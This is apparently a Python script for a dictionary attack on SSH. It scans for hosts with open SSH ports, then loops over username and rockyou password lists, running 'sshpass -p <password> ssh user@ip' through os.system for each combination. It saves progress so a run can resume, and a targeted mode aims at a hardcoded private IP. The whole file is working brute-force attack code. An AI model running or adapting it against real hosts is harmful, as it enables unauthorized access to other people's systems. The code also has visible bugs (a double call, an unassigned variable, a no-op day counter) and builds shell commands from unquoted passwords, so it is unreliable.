import os
import time
from SSHFiles import checkIfFileExist

'''
-------------------------------------------------------MYIMPORTS-------------------------------------------------------
'''

import SSHScanNetwork
import SSHFiles

myCurrentGlobalIp = SSHScanNetwork.getMyGlobalIp()

splitBy = SSHFiles.detectOS()
getPathToCurrentDir = SSHFiles.getPathToCurrentDir()
amountOfLinesInRockyou = SSHFiles.getAmountOfLinesInFile(getPathToCurrentDir + "rockyou2.txt")
#print(linesInFile)

'''
-------------------------------------------------------TIMING-------------------------------------------------------
'''

days = 0
hours = 0
minutes = 0
runtimeSeconds = time.process_time()

'''
-------------------------------------------------------MODE-------------------------------------------------------
'''

mode2 = "ssh"
mode = "sshpass -p"
toAttack = "potet"
server = "192.168.1.131"

'''
-------------------------------------------------------FILES TO READ-------------------------------------------------------
'''

passwordFile = "rockyou2.txt"
usernameFile = "usernames.txt"
IPFolderName = "IPs"

#Reading passwords
passwords = usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "rockyou2.txt")

#Reading usernames
usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "usernames.txt")

ipAddresses = SSHScanNetwork.getListWithIpsOfOpenSSHPorts()

'''
-------------------------------------------------------TIME-------------------------------------------------------
'''

def formatTime(runtimeSeconds, minutes, hours, days):
    runtimeSeconds = time.process_time_ns() / 100000000
    if runtimeSeconds >= 60:
        runtimeSeconds = runtimeSeconds - 60
        minutes = minutes + 1
    if  minutes >= 60:
        minutes = minutes - 60
        hours = hours + 1
    if hours >= 24:
        hours = hours - 24
        days + days + 1
    return "D: " + str(days) + "H: " + str(hours) + "M: " + str(minutes) + "S: " + str(runtimeSeconds)

'''
-------------------------------------------------------PROGRAMS-------------------------------------------------------
'''

def threadAttack():
    saveProgressNumber = round(amountOfLinesInRockyou / 100000)
    counter = 0
    isError = False
    #print(SSHFiles.checkIfFileExist(getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp), getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp)
    if SSHFiles.checkIfFileExist(getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp):
        #If folder does not exist create a new folder using myCurrentGlobalIp as name
        SSHFiles.makeDirectory(getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp)
    for ip in ipAddresses:
        if isError:
            break
        #print(ip)
        SSHFiles.createTXTFileInSpecifiedDir(getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt")
        for user in usernames:
            if isError:
                break
            removingBreakline = user.split("\n")
            user = removingBreakline[0]
            index = resumeFromWhere(ip + ".txt", user)
            if index == -1:
                #Goes to next user
                continue
            nextSaveAtIndex = saveProgressNumber
            printOnce = True
            for pw in passwords:
                try:
                    if isError:
                        break
                    counter += 1
                    if counter <= index:
                        if printOnce:
                            printOnce = False
                            print("Skipping all previously tried passwords...")
                        #Skipping all previously tried passwords
                        if nextSaveAtIndex == counter:
                            nextSaveAtIndex = nextSaveAtIndex + saveProgressNumber
                        continue
                    if amountOfLinesInRockyou == counter:
                        writeProgress(ip, user, "DONE")
                    if nextSaveAtIndex == counter:
                        #For every 143 lines it saves progress
                        writeProgress(ip, user, 1)
                        nextSaveAtIndex = nextSaveAtIndex + saveProgressNumber
                    #pw = pw[:-1]
                    password = str(pw)
                    passwordList = password.split("\n")
                    password = passwordList[0]
                    print("\nAttacking: " + ip + " with user: " + str(user) + " Trying with password: " + password + " Attempt: " + str(counter))
                    print("Next save is at index: " + str(nextSaveAtIndex))
                    #commandLiteral = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    #print(commandLiteral)
                    command = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    os.system(command)
                except KeyboardInterrupt:
                    print("etasd")
                    isError = True
                    break

def attackAllOnScannedNetworkBySequenceImproved():
    counter = 0
    isError = False
    for ip in ipAddresses:
        if isError:
            break

def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
    # EG VAR HER SIST
    #ipAddress, usernameOrpassword, howManyInstances
    #Used when you have additional information about target
    #usernameOrpassword is a list with '-u username' AND OR '-p password' 

    #username = -u 'username'
    #password = -p 'password'

    print("")

    nilsIP = "192.168.1.111"
    counter = 0
    isError = False
    for pw in passwords:
        try:
            if isError:
                break
            counter += 1
            pw = pw[:-1]
            password = str(pw)
            command = mode + " " + password + " " + mode2 + " potet" + "@" + nilsIP
            os.system(command)
        except KeyboardInterrupt:
            print("etasd")
            isError = True
            break

#def readPreviouslyAttacked(listWithIPs):

'''
-------------------------------------------------------HELPERS-------------------------------------------------------
'''

def resumeFromWhere(ip, username):
    filename = getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip
    index = 0
    if SSHFiles.checkIfFileExist(filename):
        #Checks if current ip has a file named after itsself if it has returns true
        contentOfFile = SSHFiles.readTXTFile(filename)
        for i in range(SSHFiles.getAmountOfLinesInFile(filename)):
            splitList = contentOfFile[i].split(" ")
            if username == splitList[0] and splitList[1]  == "DONE":
                print("Done testing passwords for this user. Proceeding to next user...")
                index = -1
                break
            elif username == splitList[0]:
                index = index + (14.3 * pow(10, int(splitList[1])))
        #Returns the index where it should start to read for new passwords for the user
    #If file does not exist then it has not attempted to log in on that ip yet
    #Starts from index 0
    print("Resuming from index " + str(index))
    return index

def writeProgress(ip, username, value):
    #Default value is 1
    #See info.txt in IPs
    print("Adding progress to file...")
    SSHFiles.addTextToSpecifiedFile(getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt", username + " " + str(value) + " \n")

def checkIfIpIsUnderAttack(ip):
    baseSecondsToCheck = 7.5
    ipToCheck = getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt"
    #Checks if file has been updated in the last 7.5 seconds
    amountOfLinesInThePast = SSHFiles.getAmountOfLinesInFile(ipToCheck)
    future = time.process_time() + baseSecondsToCheck
    while now < future:
        now = time.process_time()
        getLinesNow = SSHFiles.getAmountOfLinesInFile(ipToCheck)

    if amountOfLinesInThePast != getLinesNow:
        #If lines are different the ip is under attack
        return True
    return False

'''
-------------------------------------------------------MAIN-------------------------------------------------------
'''

'''
-------------------------------------------------------MAIN-------------------------------------------------------
'''


#targetAttack()
threadAttack()()
#writeProgress("192.168.1.20", "test")
#print(resumeFromWhere("192.168.1.20.txt", "isak"))